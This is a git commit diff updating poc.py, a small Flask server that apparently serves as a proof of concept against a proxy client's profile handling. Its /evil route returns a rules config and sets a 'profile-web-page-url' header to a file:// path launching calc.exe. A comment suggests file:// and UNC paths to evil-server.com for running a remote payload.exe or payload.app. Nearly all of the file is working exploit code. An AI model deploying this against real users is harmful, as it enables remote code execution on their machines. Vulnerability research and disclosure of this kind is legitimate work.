5cca80aa3a647db5b1352a22c544b0a8977819da
LovelyWei <16489620+LovelyWei@users.noreply.github.com>
2023-09-08 23:23:03 +0800

    Update poc.py

--- poc.py
+++ poc.py
@@ -3,14 +3,17 @@
 from flask import Flask, make_response
  
 app = Flask(__name__)
-
+ 
 @app.route("/evil")
 def index():
-    resp = make_response("index page 2")  
+    resp = make_response("""
+rules:
+  - DOMAIN-SUFFIX,evil,DIRECT
+""")
     resp.headers["profile-web-page-url"] = """file://c:/windows/system32/calc.exe """
     # poc try file://net/evil-server.com/nfs/evil/payload.app \\evil-server.com\evil\payload.exe to execute remote payload
     return resp
-
+ 
 if __name__ == '__main__':
     app.run(host = '0.0.0.0',
         port = 80,  
